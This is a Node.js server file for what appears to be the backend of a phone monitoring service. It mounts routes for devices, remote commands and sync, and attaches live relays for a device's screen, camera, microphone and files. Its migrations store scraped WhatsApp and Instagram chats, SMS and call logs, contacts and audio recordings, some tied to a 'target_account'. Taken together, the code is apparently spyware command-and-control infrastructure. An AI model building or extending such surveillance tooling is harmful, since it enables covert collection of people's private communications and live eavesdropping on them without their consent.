const path = require("path");
require("dotenv").config({ path: path.resolve(__dirname, "../.env") });
require("dotenv").config();
const http = require("http");
const express = require("express");
const cors = require("cors");
const helmet = require("helmet");
const morgan = require("morgan");
const { attachFileRelay } = require("./ws/fileRelay");
const { attachScreenRelay } = require("./ws/screenRelay");
const { attachCameraRelay } = require("./ws/cameraRelay");
const { attachAudioRelay } = require("./ws/audioRelay");

const app = express();

app.use(helmet());

// DASHBOARD_ORIGIN accepts a comma-separated list, so local dev
// (http://localhost:5173) and a deployed dashboard URL can both be allowed
// at once without editing this file — just add to the env var.
const allowedOrigins = (process.env.DASHBOARD_ORIGIN || "*")
  .split(",")
  .map((o) => o.trim())
  .filter(Boolean);
app.use(
  cors({
    origin: allowedOrigins.includes("*") ? "*" : allowedOrigins,
  })
);
app.use(morgan("dev"));
app.use(express.json({ limit: "30mb" }));

// Health check
app.get("/health", (req, res) => {
  res.json({ status: "ok", service: "spapp-monitoring-backend" });
});

// Route mounts (added as each module is built)
app.use("/api/auth", require("./routes/auth.routes"));
app.use("/api/tenants", require("./routes/tenant.routes"));
app.use("/api/devices", require("./routes/device.routes"));
app.use("/api/devices", require("./routes/command.routes"));
app.use("/api/devices", require("./routes/blockrule.routes"));
app.use("/api/sync", require("./routes/sync.routes"));
app.use("/api/admin", require("./routes/admin.routes"));


// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: "Not found" });
});

// Central error handler
app.use((err, req, res, next) => {
  console.error(err);
  res.status(err.status || 500).json({ error: err.message || "Internal server error" });
});

const PORT = process.env.PORT || 4000;
const server = http.createServer(app);
attachFileRelay(server);
attachScreenRelay(server);
attachCameraRelay(server);
attachAudioRelay(server);

// Ensure required tables and columns exist
const pool = require("./db/pool");

(async function runMigrations() {
  try {
    await pool.query(`
      DELETE FROM whatsapp_messages
      WHERE message_text IN ('WhatsApp Group', 'Camera', 'Send', 'Attach', 'Payment', 'Emoji, GIFs and stickers', 'Go to most recent message')
         OR message_text LIKE 'Voice message, Button%'
         OR message_text LIKE 'Reactions:%'
         OR message_text ~ '^[0-9]+$'
         OR chat_name IN ('WhatsApp Group', 'Send', 'Type a message', 'Search', 'WhatsApp', 'WhatsApp Business')
         OR chat_name LIKE '%picture'
         OR chat_name LIKE '%filter%'
         OR sender LIKE '%picture';
      DELETE FROM whatsapp_chats
      WHERE chat_name LIKE '%picture'
         OR chat_name LIKE '%filter%'
         OR chat_name LIKE '%unread status%'
         OR chat_name IN ('WhatsApp Group', 'Send', 'Type a message', 'Search', 'WhatsApp', 'WhatsApp Business', 'Payments on WhatsApp');
      DELETE FROM whatsapp_messages a USING whatsapp_messages b
      WHERE a.id > b.id
        AND a.device_id = b.device_id
        AND LOWER(TRIM(a.chat_name)) = LOWER(TRIM(b.chat_name))
        AND a.message_text = b.message_text
        AND a.is_outgoing = b.is_outgoing
        AND ABS(EXTRACT(EPOCH FROM (a.message_time - b.message_time))) < 600;
      DELETE FROM whatsapp_messages a USING whatsapp_messages b
      WHERE a.device_id = b.device_id
        AND LOWER(TRIM(a.chat_name)) = LOWER(TRIM(b.chat_name))
        AND a.message_text = b.message_text
        AND a.is_outgoing = false
        AND b.is_outgoing = true
        AND ABS(EXTRACT(EPOCH FROM (a.message_time - b.message_time))) < 600;

      -- Self-healing data migration: separate bundled group chat senders from chat_name
      UPDATE whatsapp_messages
      SET chat_name = TRIM(SPLIT_PART(sender, ' @ ', 2)),
          sender = TRIM(SPLIT_PART(sender, ' @ ', 1))
      WHERE sender LIKE '% @ %';

      -- Remove multi-chat summary notification artifacts
      DELETE FROM whatsapp_messages WHERE chat_name ~* '^\\s*\\d+\\s+messages?\\s+from\\s+\\d+\\s+chats?';
      DELETE FROM whatsapp_chats WHERE chat_name ~* '^\\s*\\d+\\s+messages?\\s+from\\s+\\d+\\s+chats?';
    `);
  } catch (err) {
    console.warn("WhatsApp noise cleanup warning:", err?.message);
  }

  const migrations = [
    `ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS contact_name VARCHAR(255);`,
    `ALTER TABLE sms_logs ADD COLUMN IF NOT EXISTS contact_name VARCHAR(255);`,

    `CREATE TABLE IF NOT EXISTS whatsapp_messages (
      id              BIGSERIAL PRIMARY KEY,
      device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
      chat_name       VARCHAR(255) NOT NULL,
      sender          VARCHAR(255),
      message_text    TEXT NOT NULL,
      is_outgoing     BOOLEAN NOT NULL DEFAULT false,
      message_time    TIMESTAMPTZ NOT NULL,
      media_type      VARCHAR(50),
      media_path      TEXT,
      synced_at       TIMESTAMPTZ NOT NULL DEFAULT now()
    );`,
    `CREATE INDEX IF NOT EXISTS idx_whatsapp_messages_device_chat ON whatsapp_messages(device_id, chat_name, message_time DESC);`,
    `CREATE INDEX IF NOT EXISTS idx_whatsapp_messages_device_time ON whatsapp_messages(device_id, message_time DESC);`,

    `CREATE TABLE IF NOT EXISTS whatsapp_chats (
      id              BIGSERIAL PRIMARY KEY,
      device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
      chat_name       VARCHAR(255) NOT NULL,
      phone_number    VARCHAR(100),
      last_message    TEXT,
      last_message_at TIMESTAMPTZ DEFAULT now(),
      synced_at       TIMESTAMPTZ DEFAULT now(),
      UNIQUE (device_id, chat_name)
    );`,
    `CREATE INDEX IF NOT EXISTS idx_whatsapp_chats_device ON whatsapp_chats(device_id, last_message_at DESC);`,

    `CREATE TABLE IF NOT EXISTS instagram_messages (
      id              BIGSERIAL PRIMARY KEY,
      device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
      chat_name       VARCHAR(255) NOT NULL,
      sender          VARCHAR(255),
      message_text    TEXT NOT NULL,
      is_outgoing     BOOLEAN NOT NULL DEFAULT false,
      message_time    TIMESTAMPTZ NOT NULL,
      media_type      VARCHAR(50),
      media_path      TEXT,
      reel_url        TEXT,
      synced_at       TIMESTAMPTZ NOT NULL DEFAULT now()
    );`,
    `CREATE INDEX IF NOT EXISTS idx_instagram_messages_device_chat ON instagram_messages(device_id, chat_name, message_time DESC);`,
    `CREATE INDEX IF NOT EXISTS idx_instagram_messages_device_time ON instagram_messages(device_id, message_time DESC);`,

    `CREATE TABLE IF NOT EXISTS instagram_chats (
      id              BIGSERIAL PRIMARY KEY,
      device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
      chat_name       VARCHAR(255) NOT NULL,
      username        VARCHAR(255),
      last_message    TEXT,
      last_message_at TIMESTAMPTZ DEFAULT now(),
      synced_at       TIMESTAMPTZ DEFAULT now(),
      UNIQUE (device_id, chat_name)
    );`,
    `CREATE INDEX IF NOT EXISTS idx_instagram_chats_device ON instagram_chats(device_id, last_message_at DESC);`,

    `ALTER TABLE devices ADD COLUMN IF NOT EXISTS instagram_account VARCHAR(255);`,
    `ALTER TABLE instagram_messages ADD COLUMN IF NOT EXISTS target_account VARCHAR(255);`,
    `ALTER TABLE instagram_chats ADD COLUMN IF NOT EXISTS target_account VARCHAR(255);`,
    `ALTER TABLE whatsapp_messages ADD COLUMN IF NOT EXISTS reel_url TEXT;`,
    `ALTER TABLE whatsapp_chats ADD COLUMN IF NOT EXISTS username VARCHAR(255);`,
    `CREATE UNIQUE INDEX IF NOT EXISTS idx_whatsapp_messages_unique
       ON whatsapp_messages(device_id, chat_name, message_text, message_time, is_outgoing);`,
    `CREATE TABLE IF NOT EXISTS saved_contacts (
       id              BIGSERIAL PRIMARY KEY,
       device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
       name            VARCHAR(255) NOT NULL,
       phone_number    VARCHAR(100) NOT NULL,
       phone_type      VARCHAR(50) DEFAULT 'Mobile',
       account_name    VARCHAR(255) NOT NULL DEFAULT '',
       account_type    VARCHAR(255) NOT NULL DEFAULT '',
       storage_type    VARCHAR(100) NOT NULL DEFAULT 'Phone Storage',
       synced_at       TIMESTAMPTZ NOT NULL DEFAULT now(),
       UNIQUE (device_id, name, phone_number, account_name)
     );`,
    `CREATE INDEX IF NOT EXISTS idx_saved_contacts_device ON saved_contacts(device_id, name ASC);`,
    `DROP TABLE IF EXISTS calendar_events CASCADE;`,

    `CREATE TABLE IF NOT EXISTS audio_recordings (
       id               UUID PRIMARY KEY DEFAULT gen_random_uuid(),
       device_id        UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
       tenant_id        VARCHAR(255) NOT NULL,
       filename         VARCHAR(255) NOT NULL,
       file_url         TEXT,
       duration_seconds INTEGER DEFAULT 0,
       file_size_bytes  BIGINT DEFAULT 0,
       sample_rate      INTEGER DEFAULT 44100,
       channels         INTEGER DEFAULT 2,
       audio_base64     TEXT NOT NULL,
       created_at       TIMESTAMPTZ NOT NULL DEFAULT now()
     );`,
    `CREATE INDEX IF NOT EXISTS idx_audio_recordings_device ON audio_recordings(device_id, created_at DESC);`,

    `UPDATE remote_commands
     SET status = 'failed', result = '{"error": "Expired on server restart"}'::jsonb, completed_at = now()
     WHERE status IN ('pending', 'sent') AND created_at < now() - interval '5 minutes';`
  ];

  for (const sql of migrations) {
    try {
      await pool.query(sql);
    } catch (err) {
      console.warn("Migration step notice:", err.message);
    }
  }
})();

server.listen(PORT, () => {
  console.log(`spapp-monitoring-backend listening on port ${PORT} (HTTP + WS file + screen + camera relay)`);
});
